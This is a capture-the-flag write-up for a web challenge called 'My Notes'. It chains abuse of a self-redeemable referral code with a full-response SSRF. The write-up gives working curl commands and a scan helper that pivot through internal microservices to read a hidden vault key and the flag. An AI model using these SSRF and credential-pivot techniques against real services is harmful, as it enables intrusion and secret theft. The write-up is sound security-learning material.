<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=7EF700&center=true&vCenter=true&repeat=false&width=300&height=35&lines=My+Notes+" alt="Typing SVG" /></a>

<p><img src="/img/hackincariri.webp" alt="Hack in Cariri" height="600"></p>

</div>

<p align="center"><b>English</b> · <a href="WRITEUP.es.md">Español</a> · <a href="WRITEUP.pt-BR.md">Português (BR)</a></p>

# My Notes — WEB · 200 pts · 🟢 EASY

- **Status:** ✅ SOLVED — 2 chained bugs.
- **Flag:** `HIK_SSRF_CHALLS_ARE_COOL_aea1b1f194efa878429d678d0fe22ad7`
- **Flag format:** `HIK_[text]_[md5]`
- **Access:** `https://<HOST>/`
- **Prompt:** —

---

## 0. TL;DR

1. Notes app (MyNotes / StickerBoard) that server-side fetches the URLs pasted into a note ("malware scan") and returns the response body in `response_preview` → full-response SSRF.
2. The scan costs credit; credit is farmed by self-redeeming your own referral code (broken credit gate).
3. With infinite credit, the SSRF enumerates internal microservices (IPs leaked in egress errors), reads the M2M key from a cache, and authenticates to a vault that hands out the flag.

### Chain that landed
1. `POST /referrals/redeem {code}` with your own code -> credits both sides, repeatable -> infinite credit.
2. `POST /notes` with URL `http://internal-swagger/` -> blocked, but the egress error leaks the resolved IP (`10.0.27.11`).
3. `scan http://10.0.27.11:8080/openapi.json` -> lists `cache-service:8080`, `vault-service:8080` (requires M2M).
4. `scan http://10.0.27.2:8080/cache?key=secret:vault:m2m` -> `{"value":"sk-vault-lp2026-m2m-7f3b9d2c"}` (namespace `secret:*` hidden from the listing, but readable directly).
5. `scan "http://10.0.27.5:8080/get-token?api_key=sk-vault-lp2026-m2m-7f3b9d2c"` -> `{"flag":"HIK_SSRF_CHALLS_ARE_COOL_aea1b1f194efa878429d678d0fe22ad7", ...}`.

---

## 1. Artifacts

- No local artifact — the target is the live web service at `https://<HOST>/`.

## 2. Delivery / validation

- Flag returned directly by the internal API (`vault-service`) in the body of the SSRF's `response_preview`, with no external proof-oracle.

## 3. Analysis

### 3.1 Recon

Login page (StickerBoard) + notes board. Two systems in the inline HTML/JS:

- `POST /notes` sends `{title, content, color}`; URLs in `content` are scanned and each scan returns `{url, status_code, is_safe, response_preview}`.
- Referral: `GET /referrals/me`, `POST /referrals/redeem {code}`. A scan costs 1 credit, starts at 0.

Infra comment planted in the `<head>`:

```html
<!-- infra: the URL scanner delegates to the internal microservice "internal-swagger"
     (backend network, off the internet). -->
```

### 3.2 Bug 1 — Self-redeem (credit gate)

The referral credits "both sides" when someone redeems your code, and doesn't validate that the code is your own. Redeeming your own code credits you twice, repeatable:

```bash
R=$(curl -s -X POST $B/auth/register -H 'Content-Type: application/json' \
      -d '{"username":"x","email":"x@x.com","password":"p"}')
TOK=...; CODE=...   # from the returned JSON
curl -s -X POST $B/referrals/redeem -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}"
# -> {"redeemed":true,"reward":5,"scan_quota":10,...}  (repeat to accumulate)
```

### 3.3 Bug 2 — full-response SSRF + egress bypass via leaked IP

`http://internal-swagger/` is blocked, but the error leaks the resolved IP:

```
[EGRESS-POLICY] Internal host blocked by egress policy: internal-swagger -> 10.0.27.11
```

The policy filters by hostname, but the direct IP:port passes:

```bash
# helper: tops up credit + posts a note with the internal URL, reads response_preview
scan(){ curl -s -X POST $B/referrals/redeem ... -d "{\"code\":\"$CODE\"}" >/dev/null
        curl -s -X POST $B/notes -H "Authorization: Bearer $TOK" \
          -d "{\"title\":\"t\",\"content\":\"x $1\",\"color\":\"amarelo\"}"; }

scan http://10.0.27.11:8080/openapi.json   # OpenAPI of the internal API (port 8080!)
```

### 3.4 Pivot through the internal API

OpenAPI lists `servers`: `cache-service:8080`, `vault-service:8080` (requires M2M). Endpoints: `GET /cache/keys`, `GET /cache`, `GET /get-token`. Resolve each host via the same IP trick:

```bash
scan http://10.0.27.2:8080/cache/keys
# {"keys":["app:config:version",...]}  (namespace secret:* NOT listed)

scan http://10.0.27.5:8080/
# hint: M2M via X-API-Key header OR api_key query param; credential in secret:vault:m2m

scan http://10.0.27.2:8080/cache?key=secret:vault:m2m
# {"value":"sk-vault-lp2026-m2m-7f3b9d2c"}   <- hidden namespace, readable directly

scan "http://10.0.27.5:8080/get-token?api_key=sk-vault-lp2026-m2m-7f3b9d2c"
# {"flag":"HIK_SSRF_CHALLS_ARE_COOL_aea1b1f194efa878429d678d0fe22ad7", ...}
```

(Via SSRF you only control the URL → use `?api_key=` instead of the `X-API-Key` header.)

## 4. What didn't work

There is no record of discarded hypotheses in the original material — both bugs were identified directly from recon (infra comment + referral gate with no validation).

## 5. Conclusion / next steps

The chain landed with the two bugs chained: self-redeem for infinite scan credit, and full-response SSRF with egress bypass via leaked IP to pivot to the internal vault.

### Lessons

- An egress error should never leak the resolved IP of the blocked host — it's the entire bypass.
- Hiding a key from the listing (`secret:*`) ≠ protecting it: `GET /cache?key=secret:...` reads it directly.
- Referral/credit without a self-redeem check = infinite credit.

### Pattern in the Arsenal

`Arsenal/WEB/ssrf-internal-microservice-ip-leak.md`
